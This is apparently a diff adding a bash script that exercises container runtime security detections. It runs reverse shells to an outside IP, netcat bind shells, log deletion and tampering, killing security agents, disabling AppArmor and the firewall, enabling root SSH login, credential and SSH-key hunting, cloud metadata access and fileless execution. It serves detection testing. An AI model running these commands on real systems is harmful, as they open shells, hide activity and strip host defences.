@@ -1,0 +1,124 @@
+#!/bin/bash
+
+apt update
+apt install -y net-tools wget curl nc.traditional python3 rsync masscan docker strace sudo git
+echo "#I was here" | tee -a /etc/profile
+sleep 10
+touch /etc/apt/sources.list.d/testfile
+sleep 10
+cat /root/.ssh/authorized_keys
+sleep 10
+apt install -y apache2 php curl; echo -e "<?php\nreadfile(\"/etc/pam.conf\");\nreadfile(\"/../../../etc/pam.conf\");\n?>" > /var/www/html/TMV1CS; mv /var/www/html/TMV1CS /var/www/html/TMV1CS.php; service apache2 start; curl http://127.0.0.1/TMV1CS.php
+sleep 10
+apt install -y ssh; sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config; service ssh restart; ssh root@127.0.0.1 'su - nobody; echo "Hi V1CS"'
+sleep 10
+/bin/bash -i >& /dev/tcp/8.8.8.8/443 0>&1
+sleep 10
+wget 169.254.169.254
+sleep 10
+/bin/nc.traditional -e /bin/bash 127.0.0.1 9999
+sleep 10
+cp /var/log/apt/term.log /var/log/apt/term.log.bkup; rm /var/log/apt/term.log
+sleep 10
+ln -s / woot
+sleep 10
+python3 -c "import socket; s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); print('Raw socket created successfully:', s)"
+sleep 10
+/bin/bash -i >& /dev/tcp/8.8.8.8/443 0>&1 & sleep 1
+sleep 10
+dpkg --configure -a; apt update; apt install -y kmod; insmod --v
+sleep 10
+rsync
+sleep 10
+masscan
+sleep 10
+curl http://rraannddoommtestdomainn.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
+sleep 10
+service apparmor stop
+sleep 10
+docker ps
+sleep 10
+sysctl /vm/nr_hugepages
+sleep 10
+curl -X POST -F 'username=trend' stratum+tcp://stratum.fakepool.rraannddoommtestdomainn.com:3333
+sleep 10
+touch /etc/cron.daily/testfile
+sleep 10
+touch /etc/ld.so.preload
+sleep 10
+apt-get update; DEBIAN_FRONTEND=noninteractive apt-get -yq install mysql-server; service mysql start; mysql -Bse "system cat /etc/passwd"
+sleep 10
+ssh -o BatchMode=yes -o StrictHostKeyChecking=no root@rraannddoomm.tteesstt 'whoami'
+sleep 10
+pkill cryptonight
+sleep 10
+cp /root/.bash_history /root/bash_history.bkup
+sleep 10
+echo 'Hi rrrr' > testfile; chattr -i testfile
+sleep 10
+touch testfile0; chmod u+s testfile0
+sleep 10
+rm -rf /tmp/*
+sleep 10
+curl --max-time 1 -I irc.efnet.net:6667
+sleep 10
+curl http://rraannddoommtestdomainn.com/brompwnie/botb
+sleep 10
+curl http://rraannddoommtestdomainn.com/peirates
+sleep 10
+python3 -c "import http.client; conn = http.client.HTTPConnection('example.com'); conn.request('GET', '/'); print(conn.getresponse().read().decode()); conn.close()"
+sleep 10
+find / -name id_rsa.pub
+sleep 10
+ps aux | grep 'Yun\|aegis' | awk '{print $2}' | xargs -I % kill -9 %
+sleep 10
+sed -i s/something critical happened/nothing to see here/g /var/log/dpkg.log
+sleep 10
+nsenter -t 1 -n unshare -n sh
+sleep 10
+wget https://www.rraannddoommtestdomainn.com
+sleep 10
+echo 'echo "Hi"' >/dev/shm/script.sh; /bin/bash /dev/shm/script.sh
+sleep 10
+find / -name "*.aws/credentials"
+sleep 10
+strace id
+sleep 10
+mkdir .hidden_directory
+sleep 10
+mkdir /bin/testtdirr
+sleep 10
+touch /bin/testfile && mv /bin/testfile /bin/testtdirr
+sleep 10
+mkdir /var/lib/rpm; touch /var/lib/rpm/testfile0
+sleep 10
+prlimit --nproc=1000 pid=1
+sleep 10
+useradd testuser2
+sleep 10
+userdel testuser2
+sleep 10
+echo "# Hello" > /etc/selinux/config; sed -i 's/oldstring/newstring/' /etc/selinux/config
+sleep 10
+echo "'Task executed' >> /tmp/somerraannddoommlloogg.log" | at now + 1 minute
+sleep 10
+echo -e "[Unit]\n[Service]\nExecStart=/tmp/script.sh" | tee /etc/systemd/system/my-task.service && echo -e "[Unit]\n[Timer]\nOnCalendar=*-*-* *:*:00" | tee /etc/systemd/system/my-task.timer && sudo systemctl enable --now my-task.timer
+sleep 10
+echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
+sleep 10
+python3 -c "import urllib.request; response = urllib.request.urlopen('http://www.tteessttddiirrr.com'); print(response.read())"
+sleep 10
+apt update; apt install -y python3 pip pipx; pipx install fee; pipx ensurepath; export PATH=\"$PATH:/root/.local/bin\"; source ~/.bashrc; fee /usr/bin/ls > output.py; python3 output.py
+sleep 10
+git clone https://github.com/arget13/DDexec.git; cd DDexec; base64 -w0 /bin/ls | bash ddexec.sh ls -lA; SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
+sleep 10
+touch /root/.bash_history
+grep -E '^(ssh|scp|rsync) ' "/root/.bash_history" 2>/dev/null | sort | uniq
+sleep 10
+apt install -y g++
+echo 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KdXNpbmcgbmFtZXNwYWNlIHN0ZDsKCmludCBtYWluKCkgewoJc3RyaW5nIHRlc3Q7CglpZnN0cmVhbSBSZWFkRmlsZSgibGlibHptYS5zby41LjYuMCIpOwoKCXdoaWxlIChnZXRsaW5lKFJlYWRGaWxlLCB0ZXN0KSkgewoJCWNvdXQgPDwgdGVzdDsKCX0KCglSZWFkRmlsZS5jbG9zZSgpOwoJcmV0dXJuIDA7Cn0K' | base64 -d > trigger.cpp
+g++ trigger.cpp -o sshd
+echo 'rraannddoomm' > liblzma.so.5.6.0
+./sshd
+sleep 10
+iptables -F
